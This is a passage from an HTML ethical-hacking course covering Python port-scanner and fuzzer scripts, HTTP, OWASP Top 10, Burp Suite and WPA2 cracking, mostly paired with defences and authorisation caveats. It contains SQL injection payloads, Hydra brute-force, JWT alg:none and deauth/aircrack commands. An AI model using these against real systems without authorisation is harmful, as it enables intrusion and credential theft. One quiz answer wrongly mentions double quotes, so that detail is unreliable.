    <span class="ch-phase" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">Phase 2 — Web &amp; Network</span>
  </div>
  <h2>Python <span class="accent">for Security</span></h2>
  <p class="chapter-intro">Python is the language of security research. Most exploit code, automation scripts, custom tools, and CTF solutions are written in Python. Your programming background means you'll progress here quickly.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">80% of security tools are Python. Exploit PoCs, automated scanners, custom payloads — all Python. <strong>Your competitive advantage.</strong></div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Python's socket, requests, subprocess, struct, and ctypes libraries provide direct access to networking, HTTP, processes, binary data, and C code.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Custom port scanners, exploit PoCs, web scrapers, fuzzing tools, hash crackers, CTF automation, API testing, malware (analysed in sandboxes).</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">When existing tools don't do exactly what you need. When you need to automate repetitive tasks. When writing a custom exploit for a specific vulnerability.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Pentesters writing custom exploits, bug bounty hunters automating recon, CTF players, security researchers, red teamers building tooling.</div></div>
</div>

<div class="section-label">Python Port Scanner — Build From Scratch</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">python3 — threaded port scanner</div></div><div class="code-body">#!/usr/bin/env python3
<span class="cm">"""
Port Scanner — for authorised targets only
Usage: python3 scanner.py 192.168.1.1 1-1024
"""</span>
import socket
import threading
import sys
from datetime import datetime

open_ports = []
lock = threading.Lock()

<span class="ck">def</span> scan_port(host, port):
    <span class="cm">"""Attempt TCP connection — SYN equivalent without root"""</span>
    <span class="ck">try</span>:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  <span class="cm"># 1 second timeout</span>
        result = sock.connect_ex((host, port))  <span class="cm"># 0 = success = open</span>
        <span class="ck">if</span> result == 0:
            <span class="cm"># Try banner grabbing</span>
            banner = <span class="cs">""</span>
            <span class="ck">try</span>:
                sock.send(b<span class="cs">"HEAD / HTTP/1.0\r\n\r\n"</span>)
                banner = sock.recv(1024).decode(<span class="cs">'utf-8'</span>, errors=<span class="cs">'ignore'</span>).strip()[:80]
            <span class="ck">except</span>:
                <span class="ck">pass</span>
            <span class="ck">with</span> lock:
                open_ports.append(port)
                print(f<span class="cs">"  [OPEN]  {port:5d}  {banner}"</span>)
        sock.close()
    <span class="ck">except</span>:
        <span class="ck">pass</span>

<span class="ck">def</span> main():
    host = sys.argv[1] <span class="ck">if</span> len(sys.argv) > 1 <span class="ck">else</span> <span class="cs">"127.0.0.1"</span>
    port_range = sys.argv[2] <span class="ck">if</span> len(sys.argv) > 2 <span class="ck">else</span> <span class="cs">"1-1024"</span>
    start, end = map(int, port_range.split(<span class="cs">"-"</span>))

    print(f<span class="cs">"\n[*] Scanning {host} ports {start}-{end}"</span>)
    print(f<span class="cs">"[*] Started: {datetime.now().strftime('%H:%M:%S')}\n"</span>)

    threads = []
    <span class="ck">for</span> port <span class="ck">in</span> range(start, end + 1):
        t = threading.Thread(target=scan_port, args=(host, port))
        threads.append(t)
        t.start()
        <span class="cm"># Limit concurrent threads to 100</span>
        <span class="ck">if</span> len(threads) >= 100:
            <span class="ck">for</span> t <span class="ck">in</span> threads: t.join()
            threads = []

    <span class="ck">for</span> t <span class="ck">in</span> threads: t.join()
    print(f<span class="cs">"\n[+] Scan complete. {len(open_ports)} open ports found."</span>)
    print(f<span class="cs">"[+] Open: {sorted(open_ports)}"</span>)

<span class="ck">if</span> __name__ == <span class="cs">"__main__"</span>:
    main()</div></div>

<div class="section-label">Python HTTP Fuzzer</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">python3 — directory fuzzer (authorised targets only)</div></div><div class="code-body">#!/usr/bin/env python3
<span class="cm">"""
Directory Fuzzer — finds hidden web paths
Usage: python3 fuzzer.py http://target /usr/share/wordlists/dirb/common.txt
"""</span>
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

<span class="ck">def</span> fuzz(url, word):
    target = f<span class="cs">"{url}/{word}"</span>
    <span class="ck">try</span>:
        r = requests.get(target, timeout=3, allow_redirects=<span class="cs">False</span>)
        <span class="ck">if</span> r.status_code not <span class="ck">in</span> [404, 400]:
            size = len(r.content)
            print(f<span class="cs">"  [{r.status_code}] {target} ({size} bytes)"</span>)
    <span class="ck">except</span>:
        <span class="ck">pass</span>

base_url = sys.argv[1].rstrip(<span class="cs">"/"</span>)
wordlist = sys.argv[2]

<span class="ck">with</span> open(wordlist) <span class="ck">as</span> f:
    words = [w.strip() <span class="ck">for</span> w <span class="ck">in</span> f <span class="ck">if</span> w.strip()]

print(f<span class="cs">"[*] Fuzzing {base_url} with {len(words)} words..."</span>)

<span class="ck">with</span> ThreadPoolExecutor(max_workers=20) <span class="ck">as</span> ex:
    ex.map(<span class="ck">lambda</span> w: fuzz(base_url, w), words)</div></div>

<div class="section-label">Key Python Security Libraries</div>
<div class="table-wrap">
<table>
<thead><tr><th>Library</th><th>Use Case</th><th>Install</th></tr></thead>
<tbody>
<tr><td><code>requests</code></td><td><strong>HTTP requests</strong> — web app testing, API interaction, session handling</td><td><code>pip install requests</code></td></tr>
<tr><td><code>socket</code></td><td><strong>Raw TCP/UDP</strong> — port scanners, banner grabbing, custom protocols</td><td>Built-in</td></tr>
<tr><td><code>scapy</code></td><td><strong>Packet crafting</strong> — ARP spoofing, SYN floods, custom protocol analysis</td><td><code>pip install scapy</code></td></tr>
<tr><td><code>paramiko</code></td><td><strong>SSH</strong> — automated SSH connections, SFTP, SSH brute forcing</td><td><code>pip install paramiko</code></td></tr>
<tr><td><code>pwntools</code></td><td><strong>CTF/exploitation</strong> — binary exploitation, format strings, ROP chains</td><td><code>pip install pwntools</code></td></tr>
<tr><td><code>impacket</code></td><td><strong>Windows protocols</strong> — SMB, Kerberos, NTLM attacks on AD environments</td><td><code>pip install impacket</code></td></tr>
<tr><td><code>cryptography</code></td><td><strong>Crypto operations</strong> — AES, RSA, hashing, certificate parsing</td><td><code>pip install cryptography</code></td></tr>
</tbody>
</table>
</div>`,

// ── CHAPTER 7: WEB & HTTP ────────────────────────────────
ch7: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 07</span>
    <span class="ch-phase" style="background:rgba(255,140,0,0.1);color:#ff8c00;border:1px solid rgba(255,140,0,0.3)">Phase 2 — Web Security</span>
  </div>
  <h2>Web Technologies <span class="accent">&amp; HTTP</span></h2>
  <p class="chapter-intro">The web is built on HTTP. Understanding every header, every status code, every cookie flag, and every request method at the protocol level is what separates web hackers from web users.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">Web apps are the #1 attack surface. Bug bounty programs pay millions for web vulnerabilities. Every OWASP Top 10 vulnerability begins with an HTTP request.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">HTTP is text-based. Client sends request (method + headers + body). Server responds (status code + headers + body). Cookies maintain state. TLS encrypts the channel.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Every website, web application, REST API, GraphQL endpoint, mobile app backend, and microservice on the internet.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">Web app pentesting, bug bounty hunting, API security testing, understanding attack payloads, intercepting and modifying requests in Burp Suite.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Web application pentesters, bug bounty hunters, developers who write secure code, sysadmins who configure web servers.</div></div>
</div>

<div class="section-label">HTTP Request Anatomy</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">http — complete request and response</div></div><div class="code-body"><span class="cm"># ── HTTP REQUEST ──────────────────────────────────────</span>
POST /login HTTP/1.1             <span class="cm">← Method + Path + Version</span>
Host: target.com                 <span class="cm">← Required in HTTP/1.1</span>
User-Agent: Mozilla/5.0          <span class="cm">← Browser fingerprint (fakeable)</span>
Content-Type: application/json   <span class="cm">← Body format</span>
Content-Length: 42               <span class="cm">← Body size in bytes</span>
Cookie: session=abc123           <span class="cm">← Session token (steal this)</span>
Authorization: Bearer TOKEN      <span class="cm">← API authentication</span>
X-Forwarded-For: 127.0.0.1      <span class="cm">← IP bypass header (try for admin)</span>
Referer: https://target.com/     <span class="cm">← Where request came from</span>
                                 <span class="cm">← Blank line separates headers from body</span>
{"username":"admin","password":"pass123"}  <span class="cm">← Request body</span>

<span class="cm"># ── HTTP RESPONSE ─────────────────────────────────────</span>
HTTP/1.1 200 OK                  <span class="cm">← Status line</span>
Server: nginx/1.18.0             <span class="cm">← Version disclosure (check CVEs!)</span>
Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict
X-Frame-Options: DENY            <span class="cm">← Clickjacking protection</span>
Content-Security-Policy: ...     <span class="cm">← XSS protection policy</span>
Strict-Transport-Security: ...   <span class="cm">← Force HTTPS</span>
X-Content-Type-Options: nosniff  <span class="cm">← MIME sniffing protection</span>
                                 <span class="cm">← Blank line</span>
&lt;html&gt;...&lt;/html&gt;                <span class="cm">← Response body</span></div></div>

<div class="section-label">HTTP Status Codes — Hacker's Reference</div>
<div class="table-wrap">
<table>
<thead><tr><th>Code</th><th>Meaning</th><th>Hacker Significance</th></tr></thead>
<tbody>
<tr><td><code>200 OK</code></td><td>Success</td><td>Request worked — this is what you want to see when fuzzing</td></tr>
<tr><td><code>301/302</code></td><td>Redirect</td><td>May reveal internal paths. Redirect to HTTPS = SSL stripping opportunity.</td></tr>
<tr><td><code>400</code></td><td>Bad Request</td><td>Your payload malformed the request — refine the injection</td></tr>
<tr><td><code>401</code></td><td>Unauthorised</td><td>Auth required — but 200 without auth header = auth bypass!</td></tr>
<tr><td><code>403 Forbidden</code></td><td>Access denied</td><td>Try: X-Forwarded-For: 127.0.0.1, different HTTP methods, path traversal</td></tr>
<tr><td><code>404</code></td><td>Not found</td><td>Expected when fuzzing — filter these out</td></tr>
<tr><td><code>500</code></td><td>Server Error</td><td>Your payload caused an exception — often indicates injection vulnerability</td></tr>
<tr><td><code>502/503</code></td><td>Gateway Error</td><td>Backend service crashed — possible DoS or successful overflow</td></tr>
</tbody>
</table>
</div>

<div class="section-label">Security Headers — Missing = Vulnerability</div>
<div class="table-wrap">
<table>
<thead><tr><th>Header</th><th>Purpose</th><th>Missing = Risk</th></tr></thead>
<tbody>
<tr><td><code>Content-Security-Policy</code></td><td>Restrict script/resource sources</td><td>XSS more exploitable</td></tr>
<tr><td><code>X-Frame-Options: DENY</code></td><td>Prevent iframe embedding</td><td>Clickjacking attacks</td></tr>
<tr><td><code>Strict-Transport-Security</code></td><td>Force HTTPS</td><td>SSL stripping / downgrade attacks</td></tr>
<tr><td><code>Cookie: HttpOnly</code></td><td>Prevent JS cookie access</td><td>XSS can steal session token</td></tr>
<tr><td><code>Cookie: Secure</code></td><td>Only send over HTTPS</td><td>Session stolen over HTTP</td></tr>
<tr><td><code>X-Content-Type-Options</code></td><td>Prevent MIME sniffing</td><td>Content injection attacks</td></tr>
</tbody>
</table>
</div>`,

// ── CHAPTER 8: OWASP TOP 10 ─────────────────────────────
ch8: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 08</span>
    <span class="ch-phase" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">Phase 2 — Bug Bounty Ready</span>
  </div>
  <h2>OWASP <span class="accent">Top 10</span></h2>
  <p class="chapter-intro">The OWASP Top 10 is the definitive list of the most critical web application security risks. Every bug bounty program, every penetration test, and every secure code review starts here.</p>
</div>

<div class="section-label">A01 — Broken Access Control</div>
<div class="body-text">The #1 vulnerability category. Users can act outside their intended permissions. Includes IDOR (Insecure Direct Object Reference), forced browsing, missing function-level access control.</div>
<div class="hack-box"><div class="hack-box-title">⚔️ IDOR Attack — Changing IDs to Access Other Users' Data</div><div class="hack-box-body">Request: <code>GET /api/users/1234/profile</code> → your profile.<br>Change to: <code>GET /api/users/1235/profile</code> → someone else's profile.<br>If the server returns it: IDOR vulnerability. The server trusts the ID in the URL without checking if YOU own that resource.<br><br>Test every parameter: user IDs, order IDs, file IDs, document IDs, invoice numbers. Try incrementing, decrementing, using UUIDs of other users.</div></div>
<div class="defense-box"><div class="defense-box-title">🛡️ Defense</div><div class="defense-box-body">Server must check: "Does the authenticated user OWN this resource?" Never trust IDs from the client. Use indirect references (random UUIDs instead of sequential integers). Implement access control at the object level, not just the route level.</div></div>

<div class="section-label">A02 — Cryptographic Failures</div>
<div class="body-text">Data transmitted or stored without proper encryption. Includes HTTP instead of HTTPS, weak algorithms (MD5, SHA1 for passwords), hardcoded keys, weak random number generation.</div>
<div class="hack-box"><div class="hack-box-title">⚔️ Attack Scenarios</div><div class="hack-box-body">1. Database backup found with MD5 password hashes → crack with hashcat in minutes.<br>2. API key hardcoded in JavaScript source → visible to anyone who views source.<br>3. Session token is predictable (timestamp + username) → enumerate valid sessions.<br>4. Traffic over HTTP → Wireshark captures credentials in plaintext.</div></div>

<div class="section-label">A03 — Injection (SQL, Command, LDAP)</div>
<div class="body-text">Untrusted data is sent to an interpreter as part of a command or query. SQL injection is the classic example — user input changes the structure of a database query.</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">sql injection — how it works</div></div><div class="code-body"><span class="cm"># Vulnerable PHP code:</span>
$query = "SELECT * FROM users WHERE username='" . $_GET['user'] . "'";

<span class="cm"># Normal input: admin → query becomes:</span>
SELECT * FROM users WHERE username='admin'

<span class="cm"># Malicious input: admin' OR '1'='1 → query becomes:</span>
SELECT * FROM users WHERE username='admin' OR '1'='1'
<span class="cm"># '1'='1' is always true → returns ALL users → authentication bypass!</span>

<span class="cm"># Extract database version:</span>
admin' UNION SELECT @@version,2,3-- -

<span class="cm"># Extract all table names:</span>
admin' UNION SELECT table_name,2,3 FROM information_schema.tables-- -

<span class="cm"># Test with sqlmap (authorised targets only):</span>
sqlmap -u "http://target/login?user=admin" --dbs --batch</div></div>
<div class="defense-box"><div class="defense-box-title">🛡️ Defense — Parameterised Queries</div><div class="defense-box-body"><code>$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?"); $stmt->execute([$username]);</code><br><br>Parameterised queries separate code from data — user input can NEVER change query structure. This is the complete defence against SQL injection.</div></div>

<div class="section-label">A07 — Authentication Failures</div>
<div class="body-text">Weak implementation of authentication and session management. Includes brute-forceable login, weak passwords, insecure credential storage, session fixation.</div>
<div class="hack-box"><div class="hack-box-title">⚔️ Attack Vectors</div><div class="hack-box-body">1. No rate limiting on login → brute force with Hydra: <code>hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"</code><br>2. Default credentials: admin/admin, admin/password, root/root<br>3. JWT with algorithm=none: remove signature, server accepts any claims<br>4. Session token in URL (logs, referrer header expose it)<br>5. Forgot password → reset link predictable or never expires</div></div>

<div class="section-label">A05 — Security Misconfiguration</div>
<div class="body-text">Insecure default configurations, incomplete configs, open cloud storage, unnecessary features enabled, default accounts/passwords.</div>
<div class="table-wrap">
<table>
<thead><tr><th>Misconfiguration</th><th>Impact</th><th>Test</th></tr></thead>
<tbody>
<tr><td>Default credentials</td><td>Full admin access</td><td>admin/admin, root/root, vendor defaults</td></tr>
<tr><td>Directory listing</td><td>File disclosure</td><td>Browse to /images/ — see file list?</td></tr>
<tr><td>Error messages with stack traces</td><td>Tech stack disclosure</td><td>Send invalid input, check detailed errors</td></tr>
<tr><td>Open S3 buckets</td><td>Data exposure</td><td><code>aws s3 ls s3://target-bucket --no-sign-request</code></td></tr>
<tr><td>Debug mode enabled</td><td>Source code, env vars exposed</td><td>Django debug=True, PHP display_errors=on</td></tr>
</tbody>
</table>
</div>

<div class="section-label">Quiz — Chapter 8</div>
<div class="quiz-block">
  <div class="quiz-header"><div class="quiz-title">OWASP Top 10 Quiz</div><div class="quiz-count">4 questions</div></div>
  <div class="quiz-questions">
    <div class="quiz-q"><div class="quiz-q-num">Q1</div><div class="quiz-q-text">You find /api/orders/4521 returns your order. You change it to /api/orders/4520 and get someone else's order. What vulnerability is this and what should you do?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>IDOR (Insecure Direct Object Reference)</strong> — a type of Broken Access Control (OWASP A01).<br><br>In a bug bounty context: Stop testing, document the finding (request + response showing another user's data), report it responsibly. Do NOT access more orders or collect the data. This is a high-severity finding on most programs.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q2</div><div class="quiz-q-text">A login form is vulnerable to SQL injection. Write the payload that bypasses authentication by making the WHERE clause always true, and explain why it works.</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">Payload: <code>' OR '1'='1'-- -</code><br><br>The query becomes: <code>SELECT * FROM users WHERE username='' OR '1'='1'-- -' AND password='...'</code><br><br>The -- - comments out the rest. OR '1'='1' is always true, so the WHERE clause matches every row. The first row returned is used for login — usually the admin. The double quotes around the injected strings close the original string context properly.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q3</div><div class="quiz-q-text">What is the difference between stored XSS and reflected XSS? Which is more dangerous and why?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>Reflected XSS:</strong> Payload is in the request (URL parameter) and reflected back in the response. Victim must click a crafted link. One-time, requires social engineering.<br><br><strong>Stored XSS:</strong> Payload is saved in the database (comment, profile bio, etc.) and served to every visitor. No click required — everyone who views the page is attacked automatically.<br><br><strong>Stored XSS is more dangerous</strong> because it's persistent, automated, affects all users including admins, and can steal admin session cookies to fully compromise the application without needing admin credentials.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q4</div><div class="quiz-q-text">A JWT token's algorithm field says "HS256". You change it to "none" and remove the signature. The server accepts it. What vulnerability is this and what can you do?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">This is the <strong>JWT algorithm confusion / "alg:none" vulnerability</strong> — an authentication failure (OWASP A07).<br><br>If the server accepts algorithm=none (no signature), you can modify the JWT payload freely. Change <code>"role":"user"</code> to <code>"role":"admin"</code>, or change <code>"sub":"user123"</code> to <code>"sub":"admin"</code>, re-encode without signing, and the server accepts it as valid — giving you admin access or access to any account.</div></div>
  </div>
</div>`,

// ── CHAPTER 9: BURP SUITE ────────────────────────────────
ch9: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 09</span>
    <span class="ch-phase" style="background:rgba(168,85,247,0.1);color:#a855f7;border:1px solid rgba(168,85,247,0.3)">Phase 2 — Essential Tool</span>
  </div>
  <h2>Burp Suite <span class="accent">Mastery</span></h2>
  <p class="chapter-intro">Burp Suite is the most important tool in web application security. It intercepts every HTTP request between your browser and the target, letting you read, modify, repeat, and fuzz requests with surgical precision.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">You cannot hack what you cannot see. Burp makes every HTTP request visible and editable. <strong>It is to web hacking what a microscope is to biology.</strong></div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Burp sits as a local proxy (127.0.0.1:8080). Your browser sends requests TO Burp, Burp forwards to target, intercepts responses. You control everything in between.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Every web application pentest. Every bug bounty submission. Every OWASP Top 10 vulnerability requires Burp for efficient testing.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">From the moment you start testing a web application until you've finished. It runs throughout the entire engagement.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Web application pentesters, bug bounty hunters, developers learning about security, QA engineers testing for vulnerabilities.</div></div>
</div>

<div class="section-label">Core Burp Tools</div>
<div class="cards-grid">
  <div class="card"><div class="card-accent" style="background:#ff8c00"></div><div class="card-icon">🔀</div><div class="card-title">Proxy + Intercept</div><div class="card-body">Intercept and modify every request/response in real time. The core feature. Set intercept ON, browse normally, every request pauses for your inspection.</div></div>
  <div class="card"><div class="card-accent" style="background:#00d4ff"></div><div class="card-icon">🔁</div><div class="card-title">Repeater</div><div class="card-body">Resend a request as many times as you want with modifications. Test SQL injection payloads, try different values, compare responses. Essential for manual testing.</div></div>
  <div class="card"><div class="card-accent" style="background:#ff4455"></div><div class="card-icon">🎯</div><div class="card-title">Intruder</div><div class="card-body">Automated payload injection. Mark injection points, load wordlists, fire thousands of requests. Used for brute forcing, fuzzing, and parameter enumeration.</div></div>
  <div class="card"><div class="card-accent" style="background:#00ff88"></div><div class="card-icon">🕷️</div><div class="card-title">Scanner (Pro)</div><div class="card-body">Automated vulnerability scanning. Finds SQLi, XSS, SSRF, and more automatically. Pro version only — community edition is free and sufficient for learning.</div></div>
  <div class="card"><div class="card-accent" style="background:#a855f7"></div><div class="card-icon">📋</div><div class="card-title">HTTP History</div><div class="card-body">Every request made through the proxy is logged. Review the full history to find interesting parameters, endpoints, and data flows you might have missed.</div></div>
  <div class="card"><div class="card-accent" style="background:#ffd700"></div><div class="card-icon">🔍</div><div class="card-title">Decoder</div><div class="card-body">Encode/decode URL, Base64, HTML entities, hex. Essential for understanding and crafting encoded payloads. Multi-stage decoding reveals hidden data.</div></div>
</div>

<div class="section-label">Burp Workflow — Testing for SQLi</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">burp suite — sql injection testing workflow</div></div><div class="code-body"><span class="cm">1. Setup: Firefox → Preferences → Network → Manual Proxy</span>
<span class="cm">   Set: 127.0.0.1:8080. Install Burp CA certificate in Firefox.</span>

<span class="cm">2. Browse to login page, submit any credentials</span>

<span class="cm">3. In Proxy → HTTP History, find the POST /login request</span>
<span class="cm">   Right-click → Send to Repeater</span>

<span class="cm">4. In Repeater, test each parameter for SQLi:</span>
<span class="cm">   Original: username=admin&amp;password=test</span>
<span class="cm">   Test:     username=admin'&amp;password=test</span>
<span class="cm">   → 500 error or different response = possible SQLi</span>

<span class="cm">5. Test boolean-based:</span>
<span class="cm">   username=admin' AND '1'='1  → should work</span>
<span class="cm">   username=admin' AND '1'='2  → should fail differently</span>

<span class="cm">6. If confirmed: Send to Intruder for automated payload testing</span>
<span class="cm">   Or: use sqlmap --data "username=admin&amp;password=test" -p username</span>

<span class="cm">7. Document: request, response, evidence, impact, remediation</span></div></div>

<div class="section-label">Useful Burp Extensions (BApp Store)</div>
<div class="table-wrap">
<table>
<thead><tr><th>Extension</th><th>Purpose</th></tr></thead>
<tbody>
<tr><td><strong>Logger++</strong></td><td>Enhanced request logging with regex filtering — better than native history</td></tr>
<tr><td><strong>Param Miner</strong></td><td>Discovers hidden parameters using wordlists — finds injection points you'd miss</td></tr>
<tr><td><strong>ActiveScan++</strong></td><td>Extends scanner with additional checks for SSRF, XXE, injection variants</td></tr>
<tr><td><strong>JWT Editor</strong></td><td>Decode, modify, and re-sign JWT tokens. Test algorithm confusion attacks.</td></tr>
<tr><td><strong>Turbo Intruder</strong></td><td>High-speed intruder using Python scripts. Ideal for race conditions.</td></tr>
<tr><td><strong>Retire.js</strong></td><td>Identifies vulnerable JavaScript libraries in responses.</td></tr>
</tbody>
</table>
</div>`,

// ── CHAPTER 10: WIFI ─────────────────────────────────────
ch10: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 10</span>
    <span class="ch-phase" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">Phase 2 — Network Security</span>
  </div>
  <h2>Wi-Fi <span class="accent">&amp; Network Security</span></h2>
  <p class="chapter-intro">Wi-Fi is the most commonly tested network type in physical pentests. Understanding how WPA2 works — and where it fails — forms the foundation of wireless security assessment.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">Wi-Fi is the entry point to corporate networks in physical pentests. Rogue APs, credential capture, and network pivoting all start here.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Wi-Fi transmits data as radio waves (2.4GHz / 5GHz). 802.11 protocol manages connection. WPA2 uses 4-way handshake for key exchange. WPA3 uses SAE (more secure).</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Physical penetration tests, red team engagements, home lab testing of your own networks, corporate wireless audits with written scope.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">During physical red team engagements. When wireless is in scope. When testing your own lab environment. Never on networks you don't own.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Physical penetration testers, red teamers, network security auditors. Understanding wireless is mandatory for complete security assessments.</div></div>
</div>

<div class="section-label">WPA2 4-Way Handshake — Why It Can Be Cracked</div>
<div class="body-text">WPA2 uses a 4-way handshake to establish encryption keys. This handshake can be captured passively and the Pre-Shared Key (PSK) cracked offline against a dictionary. No connection to the network is needed for cracking.</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — wireless audit (your own lab network only)</div></div><div class="code-body"><span class="cm"># ── Step 1: Enable monitor mode on wireless adapter</span>
airmon-ng start wlan0           <span class="cm"># Creates wlan0mon</span>
iwconfig wlan0mon               <span class="cm"># Verify monitor mode</span>

<span class="cm"># ── Step 2: Discover nearby networks</span>
airodump-ng wlan0mon            <span class="cm"># Lists all APs: BSSID, channel, SSID, clients</span>

<span class="cm"># ── Step 3: Target specific network (your own lab!)</span>
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
<span class="cm">#            ↑ channel  ↑ AP MAC address     ↑ save to capture.cap</span>

<span class="cm"># ── Step 4: Wait for a client to connect (handshake captured)</span>
<span class="cm"># OR force a reconnect with deauth (your own network only):</span>
aireplay-ng --deauth 5 -a AP_BSSID wlan0mon

<span class="cm"># ── Step 5: Crack the handshake offline (no network needed)</span>
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt

<span class="cm"># ── Step 6: Restore interface</span>
airmon-ng stop wlan0mon</div></div>

<div class="section-label">Common Wireless Attacks — Concepts</div>
<div class="table-wrap">
<table>
<thead><tr><th>Attack</th><th>How It Works</th><th>Defence</th></tr></thead>
<tbody>
<tr><td><strong>WPA2 Handshake Capture</strong></td><td>Capture 4-way handshake, crack PSK offline with dictionary</td><td>Use long random passphrase (20+ chars). WPA3.</td></tr>
<tr><td><strong>Evil Twin / Rogue AP</strong></td><td>Broadcast same SSID as legitimate AP with stronger signal. Capture credentials.</td><td>Certificate-based auth (EAP-TLS). 802.1X.</td></tr>
<tr><td><strong>Deauthentication</strong></td><td>Broadcast spoofed deauth frames to disconnect clients. Force reconnect for handshake.</td><td>802.11w (Management Frame Protection).</td></tr>
<tr><td><strong>PMKID Attack</strong></td><td>Capture PMKID from beacon without waiting for client. Crack offline.</td><td>Strong unique passphrase. WPA3.</td></tr>
<tr><td><strong>WPS PIN Attack</strong></td><td>WPS PIN is 8 digits, effectively 7 due to design. Brute-forceable in hours.</td><td>Disable WPS entirely.</td></tr>
</tbody>
</table>
</div>

<div class="defense-box"><div class="defense-box-title">🛡️ Wireless Hardening Checklist</div><div class="defense-box-body"><strong>1.</strong> Use WPA3 if all devices support it. If not, WPA2 with AES (not TKIP).<br><strong>2.</strong> Passphrase: 20+ random characters. Not a dictionary word.<br><strong>3.</strong> Disable WPS — it's broken by design.<br><strong>4.</strong> Enable 802.11w (Management Frame Protection) to prevent deauth attacks.<br><strong>5.</strong> Separate guest network from production/corporate traffic.<br><strong>6.</strong> Corporate: use 802.1X (RADIUS) with certificate-based authentication — no shared secret to steal.</div></div>`,

// ── CHAPTER 11: METHODOLOGY ──────────────────────────────
ch11: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 11</span>
    <span class="ch-phase" style="background:rgba(168,85,247,0.1);color:#a855f7;border:1px solid rgba(168,85,247,0.3)">Phase 3 — Advanced</span>
  </div>
  <h2>Ethical Hacking <span class="accent">Methodology</span></h2>
  <p class="chapter-intro">Professional ethical hackers follow a structured methodology. Winging it wastes time, misses vulnerabilities, and fails clients. The methodology is what separates a $5000 pentest from a $50,000 one.</p>
</div>

<div class="section-label">The 5 Phases of Penetration Testing</div>
<div class="roadmap">
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.4);color:#00d4ff">1</div>
    <div class="rm-content">
      <div class="rm-week">PHASE 1</div>
      <div class="rm-title">Reconnaissance (Recon)</div>
      <div class="rm-desc">Gather intelligence about the target WITHOUT touching their systems. Passive recon leaves zero logs. Active recon interacts with target systems.</div>
      <div class="rm-tags"><span class="rm-tag">OSINT</span><span class="rm-tag">whois</span><span class="rm-tag">Shodan</span><span class="rm-tag">Google Dorks</span><span class="rm-tag">LinkedIn</span><span class="rm-tag">theHarvester</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.4);color:#00ff88">2</div>
    <div class="rm-content">
      <div class="rm-week">PHASE 2</div>
      <div class="rm-title">Scanning &amp; Enumeration</div>
      <div class="rm-desc">Actively probe the target to discover live hosts, open ports, running services, and their versions. Build the attack surface map.</div>
